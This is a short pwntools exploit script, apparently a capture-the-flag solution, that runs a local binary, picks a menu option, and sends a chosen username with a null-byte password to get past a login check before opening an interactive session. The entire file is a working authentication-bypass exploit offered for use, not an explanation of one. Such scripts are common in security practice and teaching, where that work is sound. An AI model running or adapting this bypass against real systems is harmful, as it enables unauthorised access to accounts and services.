from pwn import *
import sys
p = process("./a.out")


def exploit(username):
	p.recvuntil("================\n")
	p.sendlineafter("================\n",'1')
	p.sendlineafter("Please input your username:\n",username)
	p.sendlineafter("Please input your password:\n",'\x00')
	p.interactive()
if __name__ == '__main__':
	exploit(sys.argv[1])
